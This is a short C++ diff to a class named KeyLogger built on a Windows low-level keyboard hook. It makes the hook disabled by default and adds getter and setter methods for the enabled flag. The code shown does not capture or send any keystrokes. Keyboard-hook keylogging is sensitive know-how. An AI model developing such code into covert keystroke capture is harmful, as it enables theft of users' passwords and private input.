@@ -10,7 +10,7 @@ class KeyLogger
 	HHOOK HK;
 	KBDLLHOOKSTRUCT kbdStruct;
 
-    bool is_enabled = true;
+    bool is_enabled = false;
 
     //void (*HookCallbackKeyboard)(int nCode, WPARAM wParam, LPARAM lParam);
 
@@ -40,6 +40,15 @@ class KeyLogger
     }
 
 public:
+
+    bool getEnabled() {
+        return is_enabled;
+    }
+
+    void setEnabled(bool val) {
+        is_enabled = val;
+    }
+
     LRESULT(*__stdcall HookCallbackKeyboard)(int nCode, WPARAM wParam, LPARAM lParam);
 
     HHOOK * GetHK() {
